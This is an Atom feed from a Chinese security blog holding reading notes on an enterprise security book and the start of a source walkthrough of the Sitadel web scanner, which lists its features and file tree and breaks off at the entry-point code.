<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全</title>
  
  <subtitle>Love my love~</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://Bigbroke.com/"/>
  <updated>2020-03-04T10:32:00.777Z</updated>
  <id>http://Bigbroke.com/</id>
  
  <author>
    <name>Bigbroke</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《互联网企业安全高级指南》读书笔记</title>
    <link href="http://Bigbroke.com/archis/a7cdea15/"/>
    <id>http://Bigbroke.com/archis/a7cdea15/</id>
    <published>2020-03-04T10:17:30.000Z</published>
    <updated>2020-03-04T10:32:00.777Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>有幸拜读此书，来源iami师傅的读书笔记，本文结合师傅的笔记添加自己的一部分内容和思考。</p><h1 id="第一章-安全大环境与背景"><a href="#第一章-安全大环境与背景" class="headerlink" title="第一章 安全大环境与背景"></a>第一章 安全大环境与背景</h1><p>企业安全要关注的项目范畴似乎更加广义</p><ul><li>网络安全</li><li>平台和业务安全</li><li>信息安全</li><li>IT风险管理， IT审计&amp;内控</li><li>业务持续性管理BCM</li><li>安全品牌营销和渠道维护</li></ul><p>大型互联网企业安全建设的方法论<br>自研或对开源软件进行二次开发+无限水平扩展的软件架构+构建于普通中低端硬件之上（PC服务器甚至是白牌）+大数据机器学习的方式，是目前大型互联网公司用来应对业务持续性增长的主流安全解决方案。是否真的到了机器学习阶段这个有点难说，但是安全进入大数据时代则是肯定的。</p><h1 id="第二章-安全的组织"><a href="#第二章-安全的组织" class="headerlink" title="第二章 安全的组织"></a>第二章 安全的组织</h1><ul><li>极客型，创业型，中小型，大型等企业的安全水平必然不一样，而且即便在一个企业中，他的每一阶段的安全建设也是不一样的。</li><li>事前基线做好，新的服务器要确认安全，旧的逐步建立入侵检测系统。基础安全（10%的精力）做完之后投入一定的精力在业务安全，输出新的成果。领域要关注到反爬，账号等等，不同的行业关注的不一。其次要关注工具的自动化，和动作的自动化。</li></ul><h1 id="第三章-甲方安全建设方法论"><a href="#第三章-甲方安全建设方法论" class="headerlink" title="第三章 甲方安全建设方法论"></a>第三章 甲方安全建设方法论</h1><ul><li><p>不同阶段的安全建设重点</p><p>  ​    生产网络和办公网络的网络安全的基础部分</p><p>  ​    广义信息安全，业务安全</p><p>  ​    自研工具</p><p>  ​    对外开放</p></li><li><p>用“我们”去和其他部门沟通安全问题</p></li><li><p>管理的最初驱动是事件驱动和管理驱动。</p></li><li><p>针对以WEB产品为主的安全建设，一是事后修复的成本较低，二是部分的产品生命周期较短。</p></li><li><p>STRIDE威胁建模工具 </p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/image-20200211141414574-1583317174782.png" alt=""></p></li><li><p>应急响应有一个PDCERF模型</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20200211155245.png" alt=""></p></li></ul><p>TODO：</p><ul><li>需要了解的规范 ITIL(BS15000/ISO20000)</li><li>需要了解的规范 ISO27001</li><li>需要了解微软SDL</li><li>开拓视野，技术+标准系统</li><li>读《威胁建模》这本书</li></ul><p>CSO面临的问题： 如何推动安全策略？ 如何被认可，提高可信度？ 如何看待SDL？ 无法完全落地的原因是什么？</p><h1 id="第四章-业界的模糊地带"><a href="#第四章-业界的模糊地带" class="headerlink" title="第四章 业界的模糊地带"></a>第四章 业界的模糊地带</h1><ul><li>而在大型互联网下终端可能不直接告警，而是以采集数据为主，在每一个维度的安全解决方案上都会有自己的大数据环境，即单点的安全监测手段全部大数据化，通过第一次大数据计算在自己的纵向层次（例如主机入侵检测）上产生告警，而关联分析则会在利用第一次大数据计算结果的基础上提供第二次大数据计算产生更多的信息。是否在单维度上需要用到大数据计算环境，取决于IDC规模、数据量是否足够大，不大的情况下关系型数据库+黑白规则也可以胜任，而很大的时候往往需要用到大数据和机器学习。</li><li>OWASP的崛起在于，防火墙如同内衣一般起到了端口收拢和netfliter的作用。当一切收口至80，那么针对HTTP应用产生的攻击自然而然成为了防御的重点。其次也可以将WAF看做一个为七层流量清洗的NIDS设备。</li><li>当一个复杂生产网络的成千上万服务器分布在世界各地的IDC，资产附属也归不同的SA时。作为安全人员其实应该事先考虑到：逻辑架构与部署架构的差异点，以及当前架构下的资产由什么样的组织架构所属。</li></ul><h1 id="第五章-防御架构原则"><a href="#第五章-防御架构原则" class="headerlink" title="第五章 防御架构原则"></a>第五章 防御架构原则</h1><p>本章更多的讲述了安全架构上的一些原则性问题。</p><ul><li><p>攻防对抗主要是三个层面的对抗：信息对抗、技术对抗、运营能力对抗。</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200225195638.png" alt=""></p></li><li><p>互联网安全有几个比较核心的需求：快速检测、有限影响、快速溯源、快速恢复。通俗解释一遍就是：允许带着一些问题上线，但是有bug或入侵时安全人士能快速检测到而不是处于无知无觉的状态，就算发生了攻击或入侵，安全人士能做到使入侵者所获取的权限和造成的影响尽可能的小，并且安全人士有途径或快照还原入侵过程做根因分析，安全事件能在基本不影响业务的情况下恢复到健康状态。</p></li><li><p>纵深防御的前提应该是以业务层次划分域后，针对相同主机组具有同一安全级别的继续划分新的安全域。同时在数据库序列（可能业务无关）的层次划分新的安全域。</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200225202804.png" alt=""></p></li><li><p>互联网安全架构设计原则<br>  1.纵深防御</p><p>  2.多维防御</p><p>  3.降维防御</p><p>  4.实时入侵检测</p><p>  5.伸缩性、可水平扩展</p></li><li><p>在设计通过特定途径访问生产网机器的时候，在考虑网络划分的前提下仍需要考虑用户角色需要使用到的一些特殊工具。比如devops的可能拥有自动化部署工具，针对这些工具的访问方式做好怎么样的限制。</p></li><li><p>在威胁层层防护的过程，可以通过考虑同一风险项的不同层位置，以及不同层的不同风险。</p></li><li><p>对抗不仅仅在技术上，运营方面，情报获取方面等等</p></li><li><p>架构方案至少A,B，C三个以上，这样才能够提供有效的灾备。</p></li><li><p>安全域层面隔离基本上是业务上的，数据链路层隔离基本是网络上的，针对端口过滤即是网络层也是主机层的，属于更加具象化的东西。</p></li></ul><p>注意点：</p><ul><li>防御的伸缩性和水平扩展能力。当前云计算环境下，安全如何自适应服务的扩展。</li><li>检测的高性能，性能的低损耗。</li><li>业务的无感知，架构上降低耦合。（其实旁路和透明代理的模式，差不多这样）</li><li>成本要可控。大型互联网公司的海量IDC情况下怎么使得成本可控？</li><li>“信息孤岛”不可取，信息孤岛是个很严重的问题，极大的降低了劳动效率</li></ul><h1 id="第六章-基础安全措施"><a href="#第六章-基础安全措施" class="headerlink" title="第六章 基础安全措施"></a>第六章 基础安全措施</h1><p>本章主要讲述基础安全实操相关的一些技术点</p><ul><li>需要多端协同，迫使数据收拢和运行态收拢。比如说通过定制镜像杜绝一些内核开关，同时迫使特定方面的数据收敛至用户态。</li><li>网络上的基线，主机上的基线，ACL的基线，应用的基线（可写不可解析，可解析不可写），其他基础设施（LDAP，之外，重要的点应该是一个策略针对不同环境上的映射。baseline往往是管理策略。一切可变需要处于可控变化。</li><li>以白过滤黑。建立正常管理员和运维人员的行为profile，离线训练识别。</li></ul><p>TODO：</p><ul><li>搞一份安全基线的checklist （协同网络，安全组配置，系统配置，应用配置，ssh策略，账号密码策略等等，从多方位去降低，减缓攻击的过程）</li></ul><h1 id="第七章-网络安全"><a href="#第七章-网络安全" class="headerlink" title="第七章 网络安全"></a>第七章 网络安全</h1><p>本章主要讲述了企业安全中的网络安全部分</p><ul><li><p>HIDS（主机入侵检测系统）依旧有用 ,HIPS多了一个P多功能，比较典型的场景是在出口处部署NIDS，做统一流量监控，或者在此处部署NIPS。</p></li><li><p>什么时候D什么时候P要选择好，控制好自己可消耗的时延或者说可接受的时延。做出对应的检测和防护。无论是D还是P，二存一是必须的。</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200225220440.png" alt=""></p></li><li><p>WAF架构部署上有不同的方式，机房/CNAME/module部署/网络层部署/主机上等方式，混搭着来，视情况而定，同时针对规则的反馈补充应该做到行之有效。</p></li><li><p>如何建设T级的DDOS防御能力，从运营商的近源清洗到CDN的选择或自建。HTTP-DNS也不失为一种好的选择，但是各种措施之间即便都有部署，也要确定对应的调用接口的可用性。否则就会出现空有能力而无法使用的场景。（主要还是依靠运营商）</p><p>  1.网络层攻击：Syn-flood  ACK-flood  UDP-flood  ICMP-flood</p><p>  2.应用层攻击 ：CC    Dns-flood  慢速连接攻击  DOS攻击</p><p>  3.攻击方式  ： 混合型攻击     反射型攻击  流量放大型攻击  脉冲型攻击   链路泛洪型攻击</p></li><li><p>多层防御结构</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200225221345.png" alt=""></p></li><li></li></ul><p>TODO：</p><ul><li>每种ddos攻击后常见的实现选项。例如反射型背后常见的易被放大的协议</li></ul><h1 id="第八章-入侵感知体系"><a href="#第八章-入侵感知体系" class="headerlink" title="第八章 入侵感知体系"></a>第八章 入侵感知体系</h1><p>本章讲述了入侵检测相关的一些架构和技术细节，包含但不限于HIDS和NIDS，RASP，数据库审计等。也就是说以上都被算作了入侵检测体系里的产品。</p><ul><li><p>企业应该根据业务特性适应性的调整入侵检测的重点，不应该针对全场景的覆盖。</p></li><li><p>文本检测webshell 观测同目录其他文件inode是个比较有意思的想法</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200225222502.png" alt=""></p></li><li><p>流量检测webshell</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200225222239.png" alt=""></p></li><li><p>发现攻击从web层到cgi层到系统层的调用趋势，即关注上下文事件</p></li><li><p>自研HIDS的架构设计中的一些细节性问题是之前没有考虑到的。同时根源设计的最初需要考虑适应企业自身的运维体系。从行业法规需求，基础安全需求，企业自身特殊安全风险需求以及网络环境自适应等。</p></li><li><p>控制管理的功能有时候需要具有自杀功能。一些功能要偃旗息鼓，从而降低利用率。</p></li><li><p>之前做的webshell是针对文本的检测，从业务特性中针对业务请求建立基线行为，以该方式针对特定业务检测。</p></li><li><p>架构部署上需要考虑到企业的服务规模。设备的所处位置是否能够起到作用。</p></li><li><p>基于Java RASP的攻击检测：基于高危行为组合的检测模型    基于调用栈的检测模型</p></li><li><p>AST解析依旧是个不错的方式</p></li><li><p>入侵检测数据分析平台</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200225222828.png" alt=""></p></li></ul><p>TODO:</p><ul><li><p>如何能够准确的发现一个函数变动带来的整个系统中其他附属影响的变动？比如sudo的提权会导致env字段变化之类的。怎么样制造这样的实验环境并发现对应的问题？</p></li><li><p>监控文件的手法，除inotify之外呢？</p></li><li><p>进程信息获取的技术方案手法？</p><blockquote><p>周期性遍历/proc 用户态Hook Libc函数 利用LSM模块接口 内核态Hook Libc函数</p></blockquote></li><li><p>哪些父进程权限较低但子进程权限较高的正常场景？</p></li><li><p>怎么样针对蠕虫和僵尸网络建立特定的检测策略？并具有一定的抑制能力。</p></li></ul><h1 id="第九章-漏洞扫描"><a href="#第九章-漏洞扫描" class="headerlink" title="第九章 漏洞扫描"></a>第九章 漏洞扫描</h1><p>本章主要讲述了漏洞扫描相关的知识，当然依旧提到了大数据在其中的应用。</p><ul><li><p>漏洞扫描、入侵感知和应急响应是技术维度日常工作中最重要的3个部分。</p></li><li><p>先做好端口扫描和高危端口的监控， ACL扫描每天都要做</p></li><li><p>弱口令扫描也不可大意，需要注意培训安全意识以及是否应用了默认的和简单的口令</p></li><li><p>在系统和应用的扫描上不一定完全依赖于网络扫描器</p></li><li><p>自动化Web安全检测平台</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200226211104.png" alt=""></p></li><li><p>漏扫也可以用来补充资产库，在vpn服务器中会设置一个透明代理</p></li><li><p>被动式扫描器可以对处于灰色地带的资产进行防护。</p></li><li><p>减少漏扫的网络开销是件很重要的事情，同时也应该减少扫描任务。都是跟着轻重缓急来的。</p></li><li><p>在实践中，需要从以下几方面进行优化：<br>  1）不做全网的漏洞扫描，先做端口扫描，</p><p>  2）做好高危端口监控</p><p>  3）在系统和应用扫描上，不完全依赖于网络扫描器，可同时借助于本机agent扫描</p></li></ul><h1 id="第十章-移动应用安全"><a href="#第十章-移动应用安全" class="headerlink" title="第十章  移动应用安全"></a>第十章  移动应用安全</h1><ul><li>从整体业务角度来看，业务逻辑为皮，移动应用端的展示为毛。如何避免移动客户端做不应承担的判断，如何将应用安全和业务服务端逻辑进行划定是首先需要明确的。</li><li>以支付宝为例，限定数额以下的付款甚至不需要认证。这背后有很多需要背景数据收集，从第一次正常登录时设备本身的信息，包括用户日常操作行为收集的大数据等。在发现异常时，就会触发完整的认证过程了。当然在攻击者完全控制手机的情况，如果所有认证信息的要素都可以通过手机获取到，例如保存的认证信息，动态认证短信等，更多能够做到的也只有提高攻击的成本，而不能完全避免认证信息的盗用。</li></ul><h1 id="第十一章-代码审计"><a href="#第十一章-代码审计" class="headerlink" title="第十一章 代码审计"></a>第十一章 代码审计</h1><p>本章写的就更水了，只是介绍了一下开源的代码神奇工具。Coverity. 参考链接： <a href="https://scan.coverity.com" target="_blank" rel="external">https://scan.coverity.com</a></p><h1 id="第十二章-办公网络安全"><a href="#第十二章-办公网络安全" class="headerlink" title="第十二章 办公网络安全"></a>第十二章 办公网络安全</h1><p>本章主要讲述办公网相关</p><ul><li>安全网关中行为审计可以对员工上网行为做审计，可以抓内鬼和防止内部的某些安全问题。</li><li>针对特定的办公人员制定不停的安全策略，可以以此避免不同用户群的抵抗。研发给什么策略，运营给什么策略，市场给什么策略。</li><li>关注不同受众的团体特点，适应性的进行调整策略。比如说研发爱自由，运营不懂计算机。针对这些不同特点的群众，放不同的安全策略进行管控。</li><li>办公网需要明确自己防控的重点</li><li>beyondcorp不是指真的没有边界，Google也只是针对办公网做了这个。其背后依赖的是完整的鉴权体系，以及确切可控的终端。</li><li>APT既不能两手一摊不管，也不能钻牛角尖。治理APT一定要考虑ROI，或许部署蜜罐是个不错的选择。</li><li>不差钱就照着Gartner买买买</li><li>文化管理，终端管理（杀软，防泄密，远程访问），安全网关，研发管理。凑在一起</li><li>确实很多方案都是防君子不防小人。小人总有办法绕过。一定要技术管理两半搞，都要硬。</li></ul><h1 id="第十三章-安全管理体系"><a href="#第十三章-安全管理体系" class="headerlink" title="第十三章 安全管理体系"></a>第十三章 安全管理体系</h1><p>本章讲述的讲到了安全管理体系，项目管理方面</p><ul><li><p>安全管理体系图</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200226212120.png" alt=""></p></li><li><p>大型安全部门组织结构图示例</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200226212152.png" alt=""></p></li><li><p>安全的客户是什么？ 内部和外部两部分，一部分是对安全依赖的兄弟部门，另一部分外部看是2c还是2b，总之都是用户，也都是我们的客户。</p></li><li><p>KPI的设定参考IT平衡计分卡，安全团队的kpi衡量是 覆盖率，覆盖深度，检出率，TCO/ROI，技术维度指标。一句话就是拿数据来说话，别用空话衡量kpi。</p></li><li><p>内部评价指标和外部评价指标都要具备</p><blockquote><p>内部评价指标：覆盖率，覆盖深度（比如sql注入的检测，从代码扫描到waf防御，到db代理和db审计），检出率，主动止损率，TCO/ROI, 技术维度指标（在技术上的进步）</p></blockquote></li></ul><blockquote><p>外部评价指标： 攻防能力，视野和方法论，工程化能力，对业务的影响力</p></blockquote><ul><li>资产管理一定要做好，系统关联影响也是其中的一部分。</li><li>争取事情处于可控的最小集合，能够事前事中事后，均有布放。</li><li>职责矩阵要实现定义好。 RACI， Responsible， Accountable，Consulted， Informed。联系人，执行者，指挥人。要细看下这个职责矩阵。表13-3和图13-5</li><li>事前做好预案，临阵有人指挥，事情有条不紊，损失可最小化。</li><li>SRC要生态化，这个不仅是src，内部产品也要从平台化过渡到生态化。从全公司到全集团到全行业。</li></ul><h1 id="第十四章-隐私保护"><a href="#第十四章-隐私保护" class="headerlink" title="第十四章 隐私保护"></a>第十四章 隐私保护</h1><p>本章隐私保护相关</p><ul><li><p>访问控制（Identity&amp;Access Management，IAM）示意图：</p><p>  谁，对哪些资源，拥有，哪些权限，有效期是多长。</p></li><li><p>对于在线应用的后台数据存储而言，敏感数据（例如用户库、口令、密保、支付等）应考虑分表分库存储，应尽量减少一个上层应用出现漏洞时的影响</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200226213204.png" alt=""></p></li><li></li></ul><p>TODO</p><ul><li>文中提到的一些数据加密不了解，需要自己详细了解。</li><li>文件/磁盘加密</li></ul><h1 id="第十五章-业务安全与风控"><a href="#第十五章-业务安全与风控" class="headerlink" title="第十五章 业务安全与风控"></a>第十五章 业务安全与风控</h1><ul><li><p>永远的情报一知己知彼，百战不殆。</p></li><li><p>方法比技术更重要——上兵伐谋，最下攻城。技术的对抗是无止尽的，并且会不断地消耗内部的研发资源和IDC资源，改变战场规则可能起到一招退敌的效果。自己退一步可以让对方无计可施</p></li><li><p>数据比算法更重要——大数据的典型特征，算法可以不高大上，但是没有数据或数据太少，风控这件事也许你玩不起来。</p></li><li><p>纵深防御——纵深、多维度、降维防御在风控场景仍然适用，使用漏斗模型，由机器规则处理最原始的数据，逐步筛选过滤，由人工审核做最后一道防线。</p></li><li><p>账号安全</p><p>  1.注册，</p><p>  2.登录环节的问题包括：撞库、暴力破解、盗号登录、非常用设备登录、黑产小号和僵尸号登录等。</p><p>  3.账号风控架构示意图</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200226213648.png" alt=""></p></li><li><p>大型平台一般有很多应用，凭借一个登录token直接无障碍登录所有子应用在安全上并不是一个好的设计，一旦被XSS盗取token就相当于全线溃防。所以在功能和应用入口比较多的平台，会对业务划权重，分类分级，涉及个人认证信息、个人隐私、支付类的一般属于高级Web安全域，信息发布类的归入一般Web域</p></li></ul><h1 id="第十六章-大规模纵深防御体系设计与实现"><a href="#第十六章-大规模纵深防御体系设计与实现" class="headerlink" title="第十六章 大规模纵深防御体系设计与实现"></a>第十六章 大规模纵深防御体系设计与实现</h1><p>纵深防御的视角，提出了数据流视角，服务器视角，idc视角，逻辑攻防视角等方便考虑。 针对不同的IDC规模，业务类型做出适应性的定制。</p><ul><li><p>常见入侵感知数据源采集的维度 </p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200226213822.png" alt=""></p></li><li><p>逻辑攻防视角</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200226214000.png" alt=""></p></li></ul><h1 id="第十七章-分阶段的安全体系建设"><a href="#第十七章-分阶段的安全体系建设" class="headerlink" title="第十七章 分阶段的安全体系建设"></a>第十七章 分阶段的安全体系建设</h1><p>基础的事情做了就能防御大部分的攻击。在防御初期投入80%的精力去做这些事情。</p><p>当具有一定基础之后，进入系统性的建设。各种产品维持出一个解决方案体系。可能有精力投入到自研之中。</p><p>最后全方位的开始关注SDL的事情。等等。都做好了可能才完成60-80分。</p><p>其后需要清理灰色地带，资产的遗漏，系统的遗漏，变革的bug，新增的ACL覆盖，弱口令等等。 </p><p>其次就是简历完善的应急响应能力，具有多方位的止血能力。从组织到流程到技术实施都能找到对应的负责人依照一定的流程采用相应的技术完成对应的操作。快字当先，一切都要快。发现快，响应快，完成快。 持续性的运营占用整个生命周期中80%以上的精力。</p><p>在整个安全团队存在的过程中持续运营起到了保障作用。当然运营也不仅仅是纯粹运营，也需要考虑技术深度的上的进步。单点的入侵检测到大规模的入侵检测，降低海量的告警（一大坨谁看呢）等等。完成风险的闭环才能完成可持续化的运营。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;有幸拜读此书，来源iami师傅的读书笔记，本文结合师傅的笔记
      
    
    </summary>
    
      <category term="读书摘要" scheme="http://Bigbroke.com/categories/%E8%AF%BB%E4%B9%A6%E6%91%98%E8%A6%81/"/>
    
    
      <category term="读书摘要" scheme="http://Bigbroke.com/tags/%E8%AF%BB%E4%B9%A6%E6%91%98%E8%A6%81/"/>
    
  </entry>
  
  <entry>
    <title>Read-Sitadel-Source</title>
    <link href="http://Bigbroke.com/archis/f4173bf8/"/>
    <id>http://Bigbroke.com/archis/f4173bf8/</id>
    <published>2019-03-14T16:00:08.000Z</published>
    <updated>2019-03-14T16:02:58.351Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sitadel源码阅读"><a href="#Sitadel源码阅读" class="headerlink" title="Sitadel源码阅读"></a>Sitadel源码阅读</h1><p>项目地址：<a href="https://github.com/shenril/Sitadel" target="_blank" rel="external">https://github.com/shenril/Sitadel</a></p><p>Web应用程序安全扫描程序</p><p>[TOC]</p><h2 id="0x00-功能介绍"><a href="#0x00-功能介绍" class="headerlink" title="0x00 功能介绍"></a>0x00 功能介绍</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20190222153610.png" alt=""></p><h3 id="1-指纹识别"><a href="#1-指纹识别" class="headerlink" title="1. 指纹识别"></a>1. 指纹识别</h3><p>a)     服务器</p><p>b)     Web框架（CakePHP、CheeryPy……）</p><p>c)     前端框架（AngularJS、MeteorJS、VueJS……）</p><p>d)     Web应用程序防火墙（Waf）</p><p>e)     内容管理系统（CMS）</p><p>f)      操作系统（Linux、Unix……）</p><p>g)     编程语言（PHP、Ruby……）</p><p>h)     Cookie安全</p><p>i)      内容分发网络（CDN）</p><h3 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2. 攻击"></a>2. 攻击</h3><p><strong>（1）暴力破解</strong></p><ul><li>管理接口</li><li>常用后门</li><li>常用备份目录</li><li>常用备份文件</li><li>常用目录</li><li>常用文件</li><li>日志文件</li></ul><p><strong>（2）注入攻击</strong></p><ul><li>HTML注入</li><li>SQL注入</li><li>LDAP注入</li><li>XPath注入</li><li>跨站脚本（XSS）</li><li>远程文件披露（RFI）</li><li>PHP代码注入</li></ul><p><strong>（3）其他攻击</strong></p><ul><li>HTTPAllow方法</li><li>HTML对象</li><li>多重引用</li><li>Robots路径</li><li>WebDav</li><li>跨站追踪（XST）</li><li>PHPINFO</li><li>Listing</li></ul><p><strong>（4）漏洞利用</strong></p><ul><li>ShellShock</li><li>匿名密码（CVE-2007-1858）</li><li>SPDY（CVE-2012-4929）</li><li>Struts-Shock</li></ul><h2 id="0x01-整体结构"><a href="#0x01-整体结构" class="headerlink" title="0x01 整体结构"></a>0x01 整体结构</h2><table><thead><tr><th>类型</th><th>名</th><th>作用</th></tr></thead><tbody><tr><td>dir</td><td>config</td><td>配置</td></tr><tr><td>dir</td><td>lib</td><td>主要攻击文件，扩展，攻击用到的一些字典等等</td></tr><tr><td>dir</td><td>tests</td><td>测试文件</td></tr><tr><td>file</td><td>CHANGELOG</td><td>更新日志</td></tr><tr><td>file</td><td>Dockerfile</td><td>docker文件</td></tr><tr><td>file</td><td>LICENSE</td><td>许可证</td></tr><tr><td>file</td><td>Makefile</td><td>使用tests文件夹做测试</td></tr><tr><td>file</td><td>README.md</td><td>介绍</td></tr><tr><td>file</td><td>setup.py</td><td>安装文件</td></tr><tr><td>file</td><td>sitadel.py</td><td>主入口文件</td></tr></tbody></table><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/Sitadel扫描器.png" alt=""></p><p>所有文件</p><pre><code>├── CHANGELOG├── config│   └── config.yml├── Dockerfile├── lib│   ├── config│   │   ├── __init__.py│   │   └── settings.py│   ├── data│   │   ├── admin.txt│   │   ├── allowmethod.txt│   │   ├── backdoor.txt│   │   ├── bdir.txt│   │   ├── bfile.txt│   │   ├── cdir.txt│   │   ├── cfile.txt│   │   ├── index.txt│   │   ├── ldap.txt│   │   ├── log.txt│   │   ├── phpinfo.txt│   │   ├── rfi.txt│   │   ├── sql.txt│   │   ├── xpath.txt│   │   └── xss.txt│   ├── __init__.py│   ├── modules│   │   ├── attacks│   │   │   ├── bruteforce│   │   │   │   ├── admin.py│   │   │   │   ├── backdoor.py│   │   │   │   ├── bdir.py│   │   │   │   ├── bfile.py│   │   │   │   ├── dir.py│   │   │   │   ├── file.py│   │   │   │   ├── __init__.py│   │   │   │   └── log.py│   │   │   ├── __init__.py│   │   │   ├── injection│   │   │   │   ├── html.py│   │   │   │   ├── __init__.py│   │   │   │   ├── ldap.py│   │   │   │   ├── php.py│   │   │   │   ├── rfi.py│   │   │   │   ├── sql.py│   │   │   │   ├── xpath.py│   │   │   │   └── xss.py│   │   │   ├── other│   │   │   │   ├── allow_method.py│   │   │   │   ├── dav.py│   │   │   │   ├── htmlobject.py│   │   │   │   ├── __init__.py│   │   │   │   ├── listing.py│   │   │   │   ├── multipleindex.py│   │   │   │   ├── phpinfo.py│   │   │   │   ├── robots.py│   │   │   │   └── xst.py│   │   │   └── vulns│   │   │       ├── anonymous.py│   │   │       ├── crime.py│   │   │       ├── __init__.py│   │   │       ├── shellshock.py│   │   │       └── strutsshock.py│   │   ├── crawler│   │   │   ├── crawler.py│   │   │   └── __init__.py│   │   ├── fingerprints│   │   │   ├── cdn│   │   │   │   ├── akamai.py│   │   │   │   ├── azure.py│   │   │   │   ├── cloudflare.py│   │   │   │   ├── cloudfront.py│   │   │   │   ├── fastly.py│   │   │   │   └── __init__.py│   │   │   ├── cms│   │   │   │   ├── drupal.py│   │   │   │   ├── __init__.py│   │   │   │   ├── joomla.py│   │   │   │   ├── magento.py│   │   │   │   └── wordpress.py│   │   │   ├── framework│   │   │   │   ├── cakephp.py│   │   │   │   ├── cherrypy.py│   │   │   │   ├── dancer.py│   │   │   │   ├── django.py│   │   │   │   ├── flask.py│   │   │   │   ├── fuelphp.py│   │   │   │   ├── grails.py│   │   │   │   ├── __init__.py│   │   │   │   ├── laravel.py│   │   │   │   ├── mvc.py│   │   │   │   ├── nette.py│   │   │   │   ├── phalcon.py│   │   │   │   ├── rails.py│   │   │   │   ├── symfony.py│   │   │   │   ├── yii.py│   │   │   │   └── zend.py│   │   │   ├── frontend│   │   │   │   ├── angularjs.py│   │   │   │   ├── emberjs.py│   │   │   │   ├── __init__.py│   │   │   │   ├── jquery.py│   │   │   │   ├── knockout.py│   │   │   │   ├── meteorjs.py│   │   │   │   ├── mootools.py│   │   │   │   ├── prototype.py│   │   │   │   ├── reactjs.py│   │   │   │   └── vuejs.py│   │   │   ├── header│   │   │   │   ├── cookie.py│   │   │   │   ├── headers.py│   │   │   │   └── __init__.py│   │   │   ├── __init__.py│   │   │   ├── lang│   │   │   │   ├── asp.py│   │   │   │   ├── __init__.py│   │   │   │   ├── java.py│   │   │   │   ├── perl.py│   │   │   │   ├── php.py│   │   │   │   ├── python.py│   │   │   │   └── ruby.py│   │   │   ├── server│   │   │   │   ├── __init__.py│   │   │   │   └── server.py│   │   │   ├── system│   │   │   │   ├── bsd.py│   │   │   │   ├── __init__.py│   │   │   │   ├── linux.py│   │   │   │   ├── mac.py│   │   │   │   ├── solaris.py│   │   │   │   ├── unix.py│   │   │   │   └── windows.py│   │   │   └── waf│   │   │       ├── airlock.py│   │   │       ├── anquanboa.py│   │   │       ├── aws.py│   │   │       ├── baidu.py│   │   │       ├── barracuda.py│   │   │       ├── bigip.py│   │   │       ├── binarysec.py│   │   │       ├── blockdos.py│   │   │       ├── chinacache.py│   │   │       ├── ciscoacexml.py│   │   │       ├── cloudflare.py│   │   │       ├── cloudfront.py│   │   │       ├── dotdefender.py│   │   │       ├── edgecast.py│   │   │       ├── fortiweb.py│   │   │       ├── hyperguard.py│   │   │       ├── incapsula.py│   │   │       ├── __init__.py│   │   │       ├── isaserver.py│   │   │       ├── kona.py│   │   │       ├── modsecurity.py│   │   │       ├── netcontinuum.py│   │   │       ├── paloalto.py│   │   │       ├── profense.py│   │   │       ├── radware.py│   │   │       ├── requestvalidationmode.py│   │   │       ├── safedog.py│   │   │       ├── secureiis.py│   │   │       ├── sengnix.py│   │   │       ├── sitelock.py│   │   │       ├── sonicwall.py│   │   │       ├── sucuri.py│   │   │       ├── trafficshield.py│   │   │       ├── varnish.py│   │   │       ├── wallarm.py│   │   │       └── webknight.py│   │   └── __init__.py│   ├── request│   │   ├── __init__.py│   │   ├── ragent.py│   │   ├── requestfactory.py│   │   └── request.py│   └── utils│       ├── banner.py│       ├── container.py│       ├── datastore.py│       ├── __init__.py│       ├── manager.py│       ├── output.py│       └── validator.py├── LICENSE├── Makefile├── README.md├── setup.py├── sitadel.py└── tests    └── lib        ├── config        │   ├── good-config.yml        │   ├── __init__.py        │   ├── test_attack_config.yml        │   ├── test_config.py        │   └── test_fingerprint_config.yml        ├── modules        │   ├── attacks        │   │   ├── __init__.py        │   │   └── test_attack.py        │   ├── fingerprints        │   │   ├── __init__.py        │   │   └── test_fingerprint.py        │   └── __init__.py        ├── request        │   ├── __init__.py        │   ├── test_ragent.py        │   └── test_request.py        └── utils            ├── __init__.py            ├── test_container.py            └── test_manager.py31 directories, 180 files</code></pre><h2 id="0x02-入口文件"><a href="#0x02-入口文件" class="headerlink" title="0x02 入口文件"></a>0x02 入口文件</h2><p>sitadel.py：</p><p>主入口文件。会先初始化一些<code>Usage</code>，接受命令行参数并进行相关的前期处理。然后根据参数开始进行扫描。</p><pre><code 